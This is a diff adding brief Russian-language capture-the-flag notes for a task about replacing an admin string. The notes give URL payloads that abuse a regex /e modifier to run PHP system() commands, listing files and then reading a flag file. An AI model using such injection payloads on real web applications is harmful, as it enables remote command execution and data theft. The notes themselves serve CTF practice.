@@ -1,0 +1,5 @@
+4 Там где нужно заменить админа
+Написать в url 
+/?vector=/Admin/e&replace=system(‘ls -l’)
+А потом 
+/?vector=/Admin/e&replace=system(‘cat here_we_dont_have_flag/flag.txt’)
